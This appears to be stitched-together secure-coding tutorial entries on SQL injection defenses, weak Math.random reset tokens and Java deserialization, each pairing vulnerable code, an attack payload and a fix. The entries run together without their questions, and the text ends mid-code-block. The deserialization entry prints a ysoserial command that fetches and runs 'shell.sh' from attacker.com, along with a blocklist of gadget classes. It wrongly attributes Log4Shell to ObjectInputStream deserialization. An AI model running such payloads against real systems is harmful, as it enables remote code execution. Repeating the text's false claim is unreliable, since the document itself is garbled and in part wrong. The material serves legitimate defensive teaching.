**Key Security Controls**:
- Parameterized queries / ORM query builder: Uses `where("u.username = :username", { username })` so user data is bound as a parameter, not concatenated into the SQL string.
- Input validation: Restricts `username` to a safe character set and length, reducing attack surface and preventing unexpected characters in queries.
- Secure error handling and logging: Returns generic errors to clients while logging detailed context server-side for monitoring and incident response, avoiding information leakage.

In production, you can safely support dynamic filters and even limited raw SQL by strictly separating query structure (which you control) from data (user input), and by layering validation, configuration, logging, and rate limiting.

**PRODUCTION PATTERN**:

```typescript
import "reflect-metadata";
import express, { Request, Response, NextFunction } from "express";
import { DataSource, Brackets } from "typeorm";
import helmet from "helmet";

// Basic rate limiting (very simple example)
const requestCounts: Record<string, { count: number; resetAt: number }> = {};
const RATE_LIMIT = 100; // requests
const WINDOW_MS = 15 * 60 * 1000; // 15 minutes

function rateLimiter(req: Request, res: Response, next: NextFunction) {
    const ip = req.ip || req.connection.remoteAddress || "unknown";
    const now = Date.now();
    const entry = requestCounts[ip] || { count: 0, resetAt: now + WINDOW_MS };

    if (now > entry.resetAt) {
        entry.count = 0;
        entry.resetAt = now + WINDOW_MS;
    }

    entry.count += 1;
    requestCounts[ip] = entry;

    if (entry.count > RATE_LIMIT) {
        console.warn("[RATE_LIMIT] Too many requests", { ip });
        return res.status(429).json({ error: "Too many requests" });
    }

    next();
}

// Environment-aware configuration
const NODE_ENV = process.env.NODE_ENV || "development";

const AppDataSource = new DataSource({
    type: "postgres",
    host: process.env.DB_HOST || "localhost",
    port: Number(process.env.DB_PORT || 5432),
    username: process.env.DB_USER || "app_user",
    password: process.env.DB_PASS || "secret",
    database: process.env.DB_NAME || "app_db",
    entities: [],
    synchronize: NODE_ENV !== "production" // never auto-sync in prod
});

const app = express();
app.use(express.json());
app.use(helmet()); // Security headers
app.use(rateLimiter);

interface UserFilter {
    username?: string;
    email?: string;
    isActive?: boolean;
}

function validateUserFilter(filter: any): UserFilter {
    const safe: UserFilter = {};
    if (typeof filter.username === "string" && /^[A-Za-z0-9_]{3,32}$/.test(filter.username)) {
        safe.username = filter.username;
    }
    if (typeof filter.email === "string" && filter.email.length <= 254 && filter.email.includes("@")) {
        safe.email = filter.email;
    }
    if (typeof filter.isActive === "boolean") {
        safe.isActive = filter.isActive;
    }
    return safe;
}

app.post("/search-users", async (req: Request, res: Response) => {
    const rawFilter = req.body || {};
    const filter = validateUserFilter(rawFilter);

    try {
        const qb = AppDataSource
            .createQueryBuilder()
            .select(["u.id", "u.username", "u.email", "u.is_active"])
            .from("users", "u");

        // Dynamic WHERE clauses using safe query builder
        qb.where("1 = 1");

        if (filter.username) {
            qb.andWhere("u.username = :username", { username: filter.username });
        }
        if (filter.email) {
            qb.andWhere("LOWER(u.email) = LOWER(:email)", { email: filter.email });
        }
        if (typeof filter.isActive === "boolean") {
            qb.andWhere("u.is_active = :isActive", { isActive: filter.isActive });
        }

        // Example of safely including limited raw SQL fragment
        // Raw fragment is constant; values remain parameterized
        if (NODE_ENV === "production") {
            qb.andWhere(new Brackets((subQb) => {
                subQb.where("u.deleted_at IS NULL");
            }));
        }

        const users = await qb.limit(100).getRawMany();

        // Audit log (without sensitive data)
        console.info("[AUDIT] User search", {
            ip: req.ip,
            filter: Object.keys(filter),
            count: users.length
        });

        res.json(users);
    } catch (err) {
        console.error("[ERROR] Failed to search users", {
            error: err instanceof Error ? err.message : String(err)
        });
        // Graceful degradation: return 503 so clients can retry later
        res.status(503).json({ error: "Service temporarily unavailable" });
    }
});

// Centralized error handler
app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
    console.error("[UNCAUGHT_ERROR]", { message: err.message, stack: err.stack });
    res.status(500).json({ error: "Internal server error" });
});

AppDataSource.initialize()
    .then(() => {
        const port = Number(process.env.PORT || 3000);
        app.listen(port, () => {
            console.log(`Server running on port ${port} in ${NODE_ENV} mode`);
        });
    })
    .catch((error) => {
        console.error("[FATAL] Failed to initialize data source", error);
        process.exit(1);
    });
```

**Defense in Depth Layers**:
1. **Strict query construction with parameters**:
   - All dynamic conditions are added via the query builder and parameters, not string concatenation:
   ```typescript
   if (filter.email) {
       qb.andWhere("LOWER(u.email) = LOWER(:email)", { email: filter.email });
   }
   ```
   - Even when using `Brackets` or limited raw SQL, the structure is static and not derived from user input.

2. **Input validation and normalization**:
   - The `validateUserFilter` function whitelists and normalizes fields before they reach the query layer:
   ```typescript
   const filter = validateUserFilter(rawFilter);
   ```
   - Unsupported or malformed fields are ignored, reducing attack surface.

3. **Operational controls: rate limiting, logging, and error handling**:
   - Rate limiting helps mitigate brute force and automated exploitation attempts:
   ```typescript
   app.use(rateLimiter);
   ```
   - Structured logs for audit and monitoring:
   ```typescript
   console.info("[AUDIT] User search", { ip: req.ip, filter: Object.keys(filter), count: users.length });
   ```
   - Centralized error handler ensures consistent, non-verbose error responses to clients while preserving stack traces in logs for incident response.

**Additional Protections**:
- **Environment-specific configuration**: Disables `synchronize` in production and uses environment variables for DB config to avoid dangerous defaults.
- **Security headers**: `helmet()` adds headers like `X-Content-Type-Options` and `Content-Security-Policy` to reduce cross-site attacks that could be chained with SQLi.
- **Graceful degradation and bounded responses**: Limiting query results (`limit(100)`) and returning 503 on DB issues prevents denial-of-service amplification and protects system stability while still signaling failure to clients.

Using Math.random() for security-sensitive tokens is extremely dangerous because it's cryptographically weak and predictable.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

// VULNERABLE: Using Math.random() for security tokens
function generateResetToken() {
  // Math.random() uses a PRNG seeded with system time
  // An attacker can predict future values!
  let token = '';
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

  for (let i = 0; i < 32; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return token;
}

app.post('/api/forgot-password', (req, res) => {
  const { email } = req.body;
  const resetToken = generateResetToken();

  // Store token and send email
  saveResetToken(email, resetToken);
  sendResetEmail(email, resetToken);

  res.json({ message: 'Reset email sent' });
});
```

**Attack Payload**:
```javascript
// Attacker script to predict Math.random() values
// By observing a few outputs, attacker can reverse-engineer the internal state
const z0_state = reverse_engineer_prng_state(observed_outputs);
const predicted_token = predict_next_token(z0_state);
console.log(`Predicted reset token: ${predicted_token}`);
// Use predicted token to reset victim's password
```

**Why This Is Dangerous**:
- Math.random() uses xorshift128+ algorithm which is NOT cryptographically secure
- Internal state can be recovered from ~628 bits of output (approximately 3-4 observed values)
- Attacker can predict all future tokens once state is known
- V8 engine implementation is well-documented, making attacks reproducible
- Token collision probability is much higher than expected

**SECURE VERSION**:

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

// SECURE: Using crypto.randomBytes() for security tokens
function generateSecureResetToken() {
  // crypto.randomBytes() uses OS-level CSPRNG
  // /dev/urandom on Linux, CryptGenRandom on Windows
  return crypto.randomBytes(32).toString('hex');
}

// Alternative: URL-safe base64 encoding
function generateUrlSafeToken() {
  return crypto.randomBytes(32).toString('base64url');
}

app.post('/api/forgot-password', async (req, res) => {
  const { email } = req.body;

  // Generate cryptographically secure token
  const resetToken = generateSecureResetToken();

  // Hash the token before storing (defense in depth)
  const tokenHash = crypto
    .createHash('sha256')
    .update(resetToken)
    .digest('hex');

  // Store only the hash, set expiration
  await saveResetToken(email, tokenHash, Date.now() + 3600000); // 1 hour expiry

  // Send unhashed token to user
  await sendResetEmail(email, resetToken);

  res.json({ message: 'Reset email sent if account exists' });
});
```

**Key Security Controls**:
- **crypto.randomBytes()**: Uses operating system's CSPRNG, cryptographically unpredictable
- **Token hashing**: Store only hash in database; if database is compromised, tokens are still protected
- **Expiration**: Tokens expire after 1 hour, limiting attack window
- **Constant response**: Same message whether email exists or not (prevents enumeration)

Excellent question! UUIDs and session IDs require the same cryptographic security. Here's a production-ready implementation with comprehensive security controls.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const crypto = require('crypto');
const { promisify } = require('util');
const redis = require('redis');
const winston = require('winston');
const rateLimit = require('express-rate-limit');

const randomBytesAsync = promisify(crypto.randomBytes);

// Configure secure logging
const logger = winston.createLogger({
  level: process.env.NODE_ENV === 'production' ? 'info' : 'debug',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'security-audit.log' })
  ]
});

class SecureTokenService {
  constructor(redisClient) {
    this.redis = redisClient;
    this.TOKEN_LENGTH = 32; // 256 bits of entropy
    this.SESSION_LENGTH = 48; // 384 bits for sessions
  }

  // Generate cryptographically secure UUID v4
  async generateSecureUUID() {
    const bytes = await randomBytesAsync(16);

    // Set version (4) and variant bits per RFC 4122
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;

    const hex = bytes.toString('hex');
    return [
      hex.slice(0, 8),
      hex.slice(8, 12),
      hex.slice(12, 16),
      hex.slice(16, 20),
      hex.slice(20)
    ].join('-');
  }

  // Generate secure session ID with metadata
  async generateSessionId(userId, ipAddress, userAgent) {
    const sessionBytes = await randomBytesAsync(this.SESSION_LENGTH);
    const sessionId = sessionBytes.toString('base64url');

    // Create session fingerprint for anomaly detection
    const fingerprint = crypto
      .createHash('sha256')
      .update(`${ipAddress}:${userAgent}`)
      .digest('hex')
      .slice(0, 16);

    const sessionData = {
      userId,
      fingerprint,
      createdAt: Date.now(),
      lastActivity: Date.now(),
      ipAddress: this.hashIP(ipAddress), // Store hashed for privacy
      rotationCount: 0
    };

    // Store with TTL
    const TTL_SECONDS = 3600; // 1 hour
    await this.redis.setEx(
      `session:${sessionId}`,
      TTL_SECONDS,
      JSON.stringify(sessionData)
    );

    logger.info('Session created', {
      event: 'session_create',
      userId,
      fingerprintPrefix: fingerprint.slice(0, 8),
      timestamp: new Date().toISOString()
    });

    return sessionId;
  }

  // Rotate session ID to prevent fixation attacks
  async rotateSession(oldSessionId) {
    const sessionJson = await this.redis.get(`session:${oldSessionId}`);
    if (!sessionJson) {
      throw new Error('Invalid session');
    }

    const sessionData = JSON.parse(sessionJson);

    // Generate new session ID
    const newSessionBytes = await randomBytesAsync(this.SESSION_LENGTH);
    const newSessionId = newSessionBytes.toString('base64url');

    // Update rotation metadata
    sessionData.rotationCount += 1;
    sessionData.lastActivity = Date.now();

    // Atomic rotation: create new, delete old
    const pipeline = this.redis.multi();
    pipeline.setEx(`session:${newSessionId}`, 3600, JSON.stringify(sessionData));
    pipeline.del(`session:${oldSessionId}`);
    await pipeline.exec();

    logger.info('Session rotated', {
      event: 'session_rotate',
      userId: sessionData.userId,
      rotationCount: sessionData.rotationCount
    });

    return newSessionId;
  }

  // Validate session with fingerprint check
  async validateSession(sessionId, ipAddress, userAgent) {
    const sessionJson = await this.redis.get(`session:${sessionId}`);

    if (!sessionJson) {
      logger.warn('Invalid session attempt', {
        event: 'session_invalid',
        sessionIdPrefix: sessionId.slice(0, 8)
      });
      return { valid: false, reason: 'Session not found' };
    }

    const sessionData = JSON.parse(sessionJson);

    // Check fingerprint for session hijacking detection
    const currentFingerprint = crypto
      .createHash('sha256')
      .update(`${ipAddress}:${userAgent}`)
      .digest('hex')
      .slice(0, 16);

    if (currentFingerprint !== sessionData.fingerprint) {
      logger.warn('Session fingerprint mismatch - possible hijacking', {
        event: 'session_hijack_attempt',
        userId: sessionData.userId,
        originalFingerprint: sessionData.fingerprint.slice(0, 8),
        currentFingerprint: currentFingerprint.slice(0, 8)
      });

      // Invalidate suspicious session
      await this.redis.del(`session:${sessionId}`);
      return { valid: false, reason: 'Session fingerprint mismatch' };
    }

    // Update last activity
    sessionData.lastActivity = Date.now();
    await this.redis.setEx(`session:${sessionId}`, 3600, JSON.stringify(sessionData));

    return { valid: true, userId: sessionData.userId };
  }

  hashIP(ip) {
    return crypto.createHash('sha256').update(ip).digest('hex').slice(0, 16);
  }
}

// Express middleware for secure sessions
const app = express();
const redisClient = redis.createClient();
const tokenService = new SecureTokenService(redisClient);

// Rate limiting for token generation endpoints
const tokenRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 requests per window
  message: { error: 'Too many requests, please try again later' },
  standardHeaders: true,
  legacyHeaders: false
});

app.post('/api/login', tokenRateLimiter, async (req, res) => {
  try {
    const { username, password } = req.body;

    // Authenticate user (implementation elsewhere)
    const user = await authenticateUser(username, password);
    if (!user) {
      logger.info('Failed login attempt', {
        event: 'login_failed',
        username: crypto.createHash('sha256').update(username).digest('hex').slice(0, 16)
      });
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Generate secure session
    const sessionId = await tokenService.generateSessionId(
      user.id,
      req.ip,
      req.get('User-Agent') || 'unknown'
    );

    // Set secure cookie
    res.cookie('sessionId', sessionId, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 3600000 // 1 hour
    });

    res.json({ message: 'Login successful' });
  } catch (error) {
    logger.error('Login error', { event: 'login_error', error: error.message });
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Session validation middleware
async function requireSession(req, res, next) {
  const sessionId = req.cookies?.sessionId;

  if (!sessionId) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  const validation = await tokenService.validateSession(
    sessionId,
    req.ip,
    req.get('User-Agent') || 'unknown'
  );

  if (!validation.valid) {
    res.clearCookie('sessionId');
    return res.status(401).json({ error: 'Session invalid' });
  }

  req.userId = validation.userId;
  next();
}

module.exports = { SecureTokenService, requireSession };
```

**Defense in Depth Layers**:

1. **Cryptographic Entropy**:
```javascript
// Always use crypto.randomBytes, never Math.random()
const token = crypto.randomBytes(32).toString('hex');
// 256 bits = 2^256 possible values = computationally infeasible to brute force
```

2. **Session Fingerprinting**:
```javascript
// Detect session hijacking via environmental fingerprint
const fingerprint = crypto
  .createHash('sha256')
  .update(`${ipAddress}:${userAgent}`)
  .digest('hex');
// If fingerprint changes, invalidate session immediately
```

3. **Token Rotation**:
```javascript
// Rotate session IDs periodically and after privilege changes
await tokenService.rotateSession(currentSessionId);
// Prevents session fixation and limits exposure window
```

**Additional Protections**:
- **Entropy monitoring**: Log if crypto.randomBytes fails or entropy pool is depleted
- **Session timeout**: Absolute timeout (e.g., 24 hours) regardless of activity
- **Concurrent session limits**: Track and limit active sessions per user
- **Geolocation anomaly detection**: Alert on impossible travel (login from different continents within minutes)
- **Secure cookie attributes**: HttpOnly, Secure, SameSite=Strict prevent client-side theft
- **Redis key expiration**: Automatic cleanup prevents storage bloat and ensures tokens expire

Using `ObjectInputStream` directly on untrusted data is extremely dangerous and has been the root cause of some of the most severe vulnerabilities in Java history, including the Log4Shell vulnerability that affected millions of applications.

**VULNERABLE CODE**:

```java
import java.io.*;
import javax.servlet.http.*;
import java.util.Base64;

public class UserSessionServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // VULNERABLE: Deserializing untrusted user input
        String sessionData = request.getParameter("session");

        if (sessionData != null) {
            byte[] data = Base64.getDecoder().decode(sessionData);
            ByteArrayInputStream bais = new ByteArrayInputStream(data);

            // DANGEROUS: ObjectInputStream on untrusted data
            ObjectInputStream ois = new ObjectInputStream(bais);
            try {
                Object userSession = ois.readObject();  // RCE happens here!
                request.getSession().setAttribute("user", userSession);
            } catch (ClassNotFoundException e) {
                response.sendError(400, "Invalid session");
            }
        }
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized object that executes system command
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' | base64 -w0

# The resulting base64 string is sent as the 'session' parameter
# When deserialized, it executes: curl http://attacker.com/shell.sh | bash
```

**Why This Is Dangerous**:
- Java deserialization can trigger arbitrary code execution through gadget chains
- Attacker doesn't need valid credentials - just needs to reach the endpoint
- Libraries like Commons Collections, Spring, Hibernate contain exploitable gadgets
- The malicious code executes with the same privileges as the application
- No authentication or authorization can prevent this if the code path is reachable

**SECURE VERSION**:

```java
import java.io.*;
import javax.servlet.http.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.json.JsonMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SecureUserSessionServlet extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SecureUserSessionServlet.class);

    // SECURE: Use JSON with strict type handling instead of Java serialization
    private static final ObjectMapper mapper = JsonMapper.builder()
        .disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)
        .build();

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String sessionJson = request.getParameter("session");

        if (sessionJson == null || sessionJson.isEmpty()) {
            response.sendError(400, "Missing session data");
            return;
        }

        try {
            // SECURE: Deserialize to specific, known type only
            UserSession userSession = mapper.readValue(sessionJson, UserSession.class);

            // Additional validation
            if (!isValidSession(userSession)) {
                logger.warn("Invalid session attempt from IP: {}", request.getRemoteAddr());
                response.sendError(403, "Invalid session");
                return;
            }

            request.getSession().setAttribute("user", userSession);
            response.setStatus(200);

        } catch (Exception e) {
            logger.error("Session deserialization failed from IP: {}", request.getRemoteAddr());
            response.sendError(400, "Invalid session format");
        }
    }

    private boolean isValidSession(UserSession session) {
        return session != null 
            && session.getUserId() > 0 
            && session.getExpiry() > System.currentTimeMillis();
    }
}

// Immutable data class - no dangerous methods
public final class UserSession implements Serializable {
    private final long userId;
    private final String username;
    private final long expiry;

    public UserSession(long userId, String username, long expiry) {
        this.userId = userId;
        this.username = username;
        this.expiry = expiry;
    }

    public long getUserId() { return userId; }
    public String getUsername() { return username; }
    public long getExpiry() { return expiry; }
}
```

**Key Security Controls**:
- **Use JSON instead of Java serialization**: JSON cannot trigger code execution during parsing
- **Deserialize to specific types**: `readValue(json, UserSession.class)` only creates UserSession objects
- **Immutable data classes**: No setters or dangerous methods that could be exploited
- **Input validation**: Verify the deserialized data makes sense for your business logic

If you absolutely must use Java serialization for legacy systems, you need multiple layers of defense. The key is implementing a strict whitelist filter that only allows known-safe classes to be deserialized.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import javax.servlet.http.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class SafeDeserializationServlet extends HttpServlet {
    private static final Logger logger = LoggerFactory.getLogger(SafeDeserializationServlet.class);
    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    // Track deserialization attempts for anomaly detection
    private static final Map<String, Integer> suspiciousAttempts = new ConcurrentHashMap<>();
    private static final int MAX_ATTEMPTS_PER_MINUTE = 5;

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        String clientIP = request.getRemoteAddr();

        // Rate limiting for deserialization endpoints
        if (isRateLimited(clientIP)) {
            securityLogger.warn("RATE_LIMIT_EXCEEDED: IP={} endpoint=deserialize", clientIP);
            response.sendError(429, "Too many requests");
            return;
        }

        String encodedData = request.getParameter("data");
        if (encodedData == null || encodedData.length() > 10000) {
            response.sendError(400, "Invalid data");
            return;
        }

        try {
            byte[] data = Base64.getDecoder().decode(encodedData);

            // Use secure deserialization with whitelist
            Object result = safeDeserialize(data, clientIP);

            if (result instanceof UserSession) {
                UserSession session = (UserSession) result;
                if (validateSession(session)) {
                    request.getSession().setAttribute("user", session);
                    response.setStatus(200);
                } else {
                    response.sendError(403, "Invalid session");
                }
            } else {
                response.sendError(400, "Unexpected data type");
            }

        } catch (SecurityException e) {
            securityLogger.error("DESERIALIZATION_ATTACK: IP={} reason={}", clientIP, e.getMessage());
            response.sendError(403, "Forbidden");
        } catch (Exception e) {
            logger.error("Deserialization error", e);
            response.sendError(400, "Invalid data format");
        }
    }

    private Object safeDeserialize(byte[] data, String clientIP) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);

        // Use custom ObjectInputStream with strict whitelist
        try (SafeObjectInputStream sois = new SafeObjectInputStream(bais, clientIP)) {
            return sois.readObject();
        }
    }

    private boolean isRateLimited(String clientIP) {
        int attempts = suspiciousAttempts.merge(clientIP, 1, Integer::sum);
        return attempts > MAX_ATTEMPTS_PER_MINUTE;
    }

    private boolean validateSession(UserSession session) {
        return session.getExpiry() > System.currentTimeMillis()
            && session.getUserId() > 0;
    }
}

/**
 * Custom ObjectInputStream with strict class whitelist.
 * This is the PRIMARY defense against deserialization attacks.
 */
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Logger securityLogger = LoggerFactory.getLogger("SECURITY_AUDIT");

    // STRICT WHITELIST: Only these classes can be deserialized
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.model.UserSession",
        "java.lang.String",
        "java.lang.Long",
        "java.lang.Integer",
        "java.util.Date",
        "[B"  // byte array
    );

    // Known dangerous classes that indicate attack attempts
    private static final Set<String> DANGEROUS_PATTERNS = Set.of(
        "org.apache.commons.collections",
        "org.apache.xalan",
        "javax.management",
        "com.sun.org.apache.xalan",
        "org.springframework.beans.factory",
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "javax.script.ScriptEngine",
        "com.mchange.v2.c3p0",
        "org.hibernate.engine",
        "ysoserial",
        "Pwner"
    );

    private final String clientIP;

    public SafeObjectInputStream(InputStream in, String clientIP) throws IOException {
        super(in);
        this.clientIP = clientIP;
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {

        String className = desc.getName();

        // Check for known attack patterns first
        for (String dangerous : DANGEROUS_PATTERNS) {
            if (className.contains(dangerous)) {
                securityLogger.error(
                    "DESERIALIZATION_ATTACK_BLOCKED: IP={} class={} pattern={}",
                    clientIP, className, dangerous
                );
                throw new SecurityException("Blocked dangerous class: " + className);
            }
        }

        // Only allow explicitly whitelisted classes
        if (!ALLOWED_CLASSES.contains(className)) {
            securityLogger.warn(
                "DESERIALIZATION_BLOCKED: IP={} class={} reason=not_whitelisted",
                clientIP, className
            );
            throw new SecurityException("Class not in whitelist: " + className);
        }

        return super.resolveClass(desc);
    }
}

/**
 * Safe serializable class with custom serialization.
 */
public final class UserSession implements Serializable {
    @Serial
    private static final long serialVersionUID = 1L;

    private final long userId;
    private final String username;
    private final long expiry;
    private final String signature;  // HMAC for integrity

    private static final String HMAC_KEY = System.getenv("SESSION_HMAC_KEY");

    public UserSession(long userId, String username, long expiry) {
        this.userId = userId;
        this.username = username;
        this.expiry = expiry;
        this.signature = computeSignature();
    }

    // Custom deserialization with integrity check
    @Serial
    private void readObject(ObjectInputStream ois) 
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();

        // Verify integrity after deserialization
        if (!verifySignature()) {
            throw new InvalidObjectException("Session signature verification failed");
        }
    }

    private String computeSignature() {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(HMAC_KEY.getBytes(), "HmacSHA256"));
            String data = userId + ":" + username + ":" + expiry;
            return Base64.getEncoder().encodeToString(mac.doFinal(data.getBytes()));
        } catch (Exception e) {
            throw new RuntimeException("Failed to compute signature", e);
        }
    }

    private boolean verifySignature() {
        return MessageDigest.isEqual(
            signature.getBytes(),
            computeSignature().getBytes()
        );
    }

    public long getUserId() { return userId; }
    public String getUsername() { return username; }
    public long getExpiry() { return expiry; }
}
```

**Defense in Depth Layers**:

1. **Class Whitelist Filter** (Primary Defense):
```java
// Only explicitly allowed classes can be deserialized
if (!ALLOWED_CLASSES.contains(className)) {
    throw new SecurityException("Class not in whitelist");
}
```

2. **Dangerous Pattern Detection** (Attack Detection):
```java
// Detect known gadget chain classes
for (String dangerous : DANGEROUS_PATTERNS) {
    if (className.contains(dangerous)) {
        securityLogger.error("ATTACK_BLOCKED: {}", className);
        throw new SecurityException("Blocked");
    }
}
```

3. **Cryptographic Integrity Verification** (Data Integrity):
```java
// HMAC signature in serialized objects
private void readObject(ObjectInputStream ois) {
    ois.defaultReadObject();
    if (!verifySignature()) {
        throw new InvalidObjectException("Tampering detected");
    }
}
```

**Additional Protections**:

- **Use Java's built-in deserialization filters (Java 9+)**:
```java
